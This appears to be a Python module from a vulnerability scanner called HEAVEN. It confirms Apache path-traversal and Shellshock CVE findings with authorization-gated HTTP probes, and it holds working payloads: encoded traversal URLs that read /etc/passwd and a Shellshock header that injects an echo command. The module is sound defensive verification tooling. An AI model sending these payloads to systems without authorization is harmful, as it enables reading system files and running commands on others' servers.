"""
HEAVEN — Active Verification of Potential (version-banner) findings.

A network *version banner* does not prove exploitability. Distributions routinely
backport security fixes without bumping the advertised version, so an
unauthenticated banner-to-CVE match is only a *lead* — HEAVEN labels it
**Potential** (see ``heaven.utils.cvss.confirmation_status``). This module closes
the loop for a curated set of well-known CVEs by running a **safe, read-only,
non-destructive** behavioural probe. When the probe produces an unambiguous
observable, the finding is promoted **Potential → Confirmed**
(``validated=True`` + ``evidence.active_verification``). When no probe exists for
the CVE, or the probe is negative, the finding is **left exactly as it was**
(still Potential) — a verification result is never fabricated, and a negative
probe never deletes a real finding (the endpoint may simply be disabled).

Safety model
------------
* Every probe is a plain HTTP GET/POST that either reads a world-readable file
  (e.g. ``/etc/passwd`` via a path-traversal flaw) or reflects a unique canary
  the operator generated. No data is written, modified, or deleted on the target.
* Probes are **authorization-gated**: ``verify_findings`` / ``verify_finding``
  only send traffic when ``authorized=True`` (the orchestrator passes this only
  when the operator opted into active verification; the ``heaven verify`` CLI
  requires ``--i-have-authorization``). Without it the finding is returned
  untouched with a ``reason`` note.
* Probes are bounded (a handful of requests, short timeouts) so verification
  cannot blow up scan time.

Extending
---------
Add a new entry to ``_PROBES`` mapping a CVE id to an ``async`` probe that takes
``(session, base_url)`` and returns a :class:`VerifyResult` (or ``None`` when the
target shape does not apply). Keep every probe strictly read-only.
"""

from __future__ import annotations

import secrets
import time
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Optional
from urllib.parse import urlparse

try:
    import aiohttp
except ImportError:  # pragma: no cover - optional dependency
    aiohttp = None  # type: ignore[assignment]

from heaven.utils.cvss import is_confirmed_finding
from heaven.utils.logger import get_logger

logger = get_logger("vulnscan.active_verifier")


# ═══════════════════════════════════════════════════════════════════════════
# RESULT
# ═══════════════════════════════════════════════════════════════════════════


@dataclass
class VerifyResult:
    """Outcome of an active-verification probe for a single finding.

    ``probed``  — a probe was actually executed against the target.
    ``proved``  — the probe produced an unambiguous exploit observable.
    """

    cve: str
    probed: bool = False
    proved: bool = False
    technique: str = ""
    notes: str = ""
    evidence: dict[str, Any] = field(default_factory=dict)


# ═══════════════════════════════════════════════════════════════════════════
# TARGET SHAPING
# ═══════════════════════════════════════════════════════════════════════════


def _base_urls(finding: dict[str, Any]) -> list[str]:
    """Candidate ``scheme://host:port`` bases to probe for a finding.

    Findings from the CVE mapper carry ``host`` + ``port``; web findings may
    carry a full ``target`` URL. We try https on the well-known TLS ports and
    http otherwise, de-duplicated and order-preserving.
    """
    host = str(finding.get("host") or "").strip()
    port = finding.get("port")
    target = str(finding.get("target") or finding.get("url") or "").strip()

    bases: list[str] = []

    def _add(url: str) -> None:
        url = url.rstrip("/")
        if url and url not in bases:
            bases.append(url)

    if target.startswith(("http://", "https://")):
        p = urlparse(target)
        if p.scheme and p.netloc:
            _add(f"{p.scheme}://{p.netloc}")

    if host:
        try:
            port_i = int(port) if port not in (None, "", 0) else 0
        except (TypeError, ValueError):
            port_i = 0
        if port_i in (443, 8443):
            _add(f"https://{host}:{port_i}")
        elif port_i in (80, 8080, 8000, 8888):
            _add(f"http://{host}:{port_i}")
        elif port_i:
            # Unknown port — try both schemes, http first (most services).
            _add(f"http://{host}:{port_i}")
            _add(f"https://{host}:{port_i}")
        else:
            _add(f"http://{host}")
    return bases


async def _get(session: Any, url: str, *, headers: Optional[dict] = None,
               timeout: float = 8.0) -> tuple[int, str]:
    """Read-only GET returning ``(status, body)``; never raises."""
    try:
        async with session.get(
            url, headers=headers or {}, allow_redirects=False,
            timeout=aiohttp.ClientTimeout(total=timeout),
        ) as resp:
            body = await resp.text(errors="replace")
            return resp.status, body
    except Exception as exc:  # noqa: BLE001 — probe failure is not fatal
        logger.debug("verify GET failed for %s: %s", url, exc)
        return 0, ""


# ═══════════════════════════════════════════════════════════════════════════
# PROBES  (each strictly read-only)
# ═══════════════════════════════════════════════════════════════════════════

# The unmistakable first line of a Unix passwd file — the canonical, harmless
# observable that a path-traversal / file-read flaw actually returned it.
_PASSWD_MARKER = "root:x:0:0:"  # nosec B105 — detection marker for /etc/passwd, not a secret


async def _probe_apache_traversal(session: Any, base: str) -> Optional[VerifyResult]:
    """CVE-2021-41773 / CVE-2021-42013 — Apache 2.4.49/2.4.50 path traversal.

    Sends the public path-traversal request for a world-readable file
    (``/etc/passwd``) and confirms only on the unambiguous ``root:x:0:0:``
    marker. This reads a world-readable file and writes nothing.
    """
    # The documented traversal vectors for the two CVEs. cgi-bin is the classic
    # alias; icons is present on a default install. Both are GETs.
    paths = [
        "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        # CVE-2021-42013 double-encoding bypass of the 41773 fix.
        "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
    ]
    for path in paths:
        status, body = await _get(session, base + path)
        if _PASSWD_MARKER in body:
            return VerifyResult(
                cve="", probed=True, proved=True, technique="path_traversal_file_read",
                notes="Read /etc/passwd via the Apache path-traversal flaw — confirmed.",
                evidence={
                    "request": f"GET {path}",
                    "observable": _PASSWD_MARKER,
                    "response_status": status,
                    "response_excerpt": body[:200],
                },
            )
    return VerifyResult(
        cve="", probed=True, proved=False, technique="path_traversal_file_read",
        notes="Traversal request did not return /etc/passwd (patched, cgi-bin "
              "disabled, or not this server) — remains Potential.",
    )


async def _probe_shellshock(session: Any, base: str) -> Optional[VerifyResult]:
    """CVE-2014-6271 — Bash 'Shellshock' via a CGI environment variable.

    Reflects a unique canary through a crafted header into a CGI script and
    confirms only when the canary comes back in the body. The payload runs
    ``echo`` of a random token — it neither writes nor deletes anything.
    """
    token = "HVN" + secrets.token_hex(6)
    payload = f"() {{ :;}}; echo; echo HVNSHOCK:{token}"
    marker = f"HVNSHOCK:{token}"
    # Common CGI endpoints a default/legacy install exposes.
    endpoints = ["/cgi-bin/status", "/cgi-bin/test.cgi", "/cgi-bin/test-cgi",
                 "/cgi-bin/", "/cgi-sys/defaultwebpage.cgi"]
    for ep in endpoints:
        status, body = await _get(
            session, base + ep,
            headers={"User-Agent": payload, "Referer": payload},
        )
        if marker in body:
            return VerifyResult(
                cve="", probed=True, proved=True, technique="shellshock_env_injection",
                notes="CGI script executed an injected echo (Shellshock) — confirmed.",
                evidence={
                    "endpoint": ep, "canary": token, "response_status": status,
                    "response_excerpt": body[:200],
                },
            )
    return VerifyResult(
        cve="", probed=True, proved=False, technique="shellshock_env_injection",
        notes="No reachable CGI endpoint reflected the canary (patched or no CGI) "
              "— remains Potential.",
    )


# CVE id → probe. Multiple CVEs can share one probe (same underlying flaw).
_PROBES: dict[str, Callable[[Any, str], Awaitable[Optional[VerifyResult]]]] = {
    "CVE-2021-41773": _probe_apache_traversal,
    "CVE-2021-42013": _probe_apache_traversal,
    "CVE-2014-6271": _probe_shellshock,
    "CVE-2014-6278": _probe_shellshock,
}


def supported_cves() -> list[str]:
    """CVE ids with a safe active-verification probe (extensible via ``_PROBES``)."""
    return sorted(_PROBES)


def _finding_cve(finding: dict[str, Any]) -> str:
    ev = finding.get("evidence") if isinstance(finding.get("evidence"), dict) else {}
    return str(finding.get("cve") or finding.get("cve_id") or ev.get("cve") or "").strip().upper()


# ═══════════════════════════════════════════════════════════════════════════
# PUBLIC API
# ═══════════════════════════════════════════════════════════════════════════


def _record(finding: dict[str, Any], record: dict[str, Any]) -> None:
    """Attach the verification record to ``evidence.active_verification``."""
    ev = finding.get("evidence")
    if not isinstance(ev, dict):
        ev = {}
    ev["active_verification"] = record
    finding["evidence"] = ev


async def verify_finding(finding: dict[str, Any], *, session: Any = None,
                         authorized: bool = False, timeout: float = 8.0) -> dict[str, Any]:
    """Attempt to promote one Potential finding to Confirmed via a safe probe.

    Mutates and returns the finding. On proof: sets ``validated=True`` and
    ``confidence`` up to 0.99, and records the proof under
    ``evidence.active_verification``. Never raises; a negative or skipped probe
    leaves the finding's confirmation status unchanged.
    """
    cve = _finding_cve(finding)
    probe = _PROBES.get(cve)
    if probe is None:
        _record(finding, {"probed": False, "proved": False,
                          "reason": f"no safe active-verification probe for {cve or 'this finding'}"})
        return finding
    if is_confirmed_finding(finding):
        # Already proven by another signal — nothing to gain from re-probing.
        _record(finding, {"probed": False, "proved": False,
                          "reason": "already Confirmed by an earlier signal"})
        return finding
    if not authorized:
        _record(finding, {"probed": False, "proved": False,
                          "reason": "active verification not authorized (opt-in required)"})
        return finding
    if aiohttp is None:
        _record(finding, {"probed": False, "proved": False,
                          "reason": "aiohttp not installed — cannot run active probe"})
        return finding

    bases = _base_urls(finding)
    if not bases:
        _record(finding, {"probed": False, "proved": False,
                          "reason": "no reachable HTTP base URL for this finding"})
        return finding

    own_session = False
    if session is None:
        from heaven.recon.auth_session import aiohttp_session_kwargs
        session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False, limit=20),
            **aiohttp_session_kwargs(),
        )
        own_session = True

    start = time.time()
    result: Optional[VerifyResult] = None
    try:
        for base in bases:
            result = await probe(session, base)
            if result is not None and result.proved:
                result.evidence["base_url"] = base
                break
    finally:
        if own_session:
            try:
                await session.close()
            except Exception:  # noqa: BLE001
                logger.debug("verify session close failed", exc_info=True)

    if result is None:
        _record(finding, {"probed": False, "proved": False, "cve": cve,
                          "reason": "probe not applicable to this target shape"})
        return finding

    record = {
        "probed": result.probed,
        "proved": result.proved,
        "cve": cve,
        "technique": result.technique,
        "notes": result.notes,
        "duration_ms": round((time.time() - start) * 1000),
        **({"proof": result.evidence} if result.evidence else {}),
    }
    _record(finding, record)

    if result.proved:
        # The probe IS ground truth — promote to Confirmed. Set the top-level
        # flag (in-memory pipeline) AND stamp the evidence so a finding that is
        # persisted and re-loaded from the store still reads Confirmed via
        # ``is_confirmed_finding`` (which inspects evidence.validation_result).
        finding["validated"] = True
        finding["proved"] = True
        finding["confidence"] = max(float(finding.get("confidence") or 0.0), 0.99)
        ev = finding.get("evidence")
        if isinstance(ev, dict):
            ev["validation_result"] = "confirmed"
    return finding


async def verify_findings(findings: Optional[list[dict[str, Any]]] = None, *,
                          authorized: bool = False, scan_id: str = "",
                          max_targets: int = 40, **_kw: Any) -> dict[str, Any]:
    """Batch active verification of Potential version-banner findings.

    Iterates findings that (a) are currently Potential and (b) have a CVE with a
    registered safe probe, promoting the ones a probe proves. Returns a summary
    plus the mutated findings under ``findings`` (identity-stable — the
    orchestrator's dedup collapses these onto the originals).
    """
    findings = findings or []
    # Only the ones worth probing: a registered CVE and still Potential.
    candidates = [
        f for f in findings
        if isinstance(f, dict)
        and _finding_cve(f) in _PROBES
        and not is_confirmed_finding(f)
    ]
    if not candidates:
        return {"skipped": True, "reason": "no Potential findings with a safe probe",
                "supported_cves": supported_cves(), "promoted": 0, "probed": 0,
                "findings": []}
    if not authorized:
        return {"skipped": True, "reason": "active verification not authorized (opt-in)",
                "candidates": len(candidates), "supported_cves": supported_cves(),
                "promoted": 0, "probed": 0, "findings": []}
    if aiohttp is None:
        return {"skipped": True, "reason": "aiohttp not installed",
                "promoted": 0, "probed": 0, "findings": []}

    logger.info("Active verification: %d Potential finding(s) with a safe probe",
                len(candidates))

    from heaven.recon.auth_session import aiohttp_session_kwargs
    promoted: list[dict] = []
    probed = 0
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False, limit=20),
        **aiohttp_session_kwargs(),
    ) as session:
        for f in candidates[:max_targets]:
            out = await verify_finding(f, session=session, authorized=True)
            rec = (out.get("evidence") or {}).get("active_verification") or {}
            if rec.get("probed"):
                probed += 1
            if rec.get("proved"):
                promoted.append(out)

    return {
        "scan_id": scan_id,
        "candidates": len(candidates),
        "probed": probed,
        "promoted": len(promoted),
        "supported_cves": supported_cves(),
        # Promoted findings are the SAME dict identities the pipeline already
        # holds (mutated in place); returned so dedup keeps the Confirmed copy.
        "findings": promoted,
    }
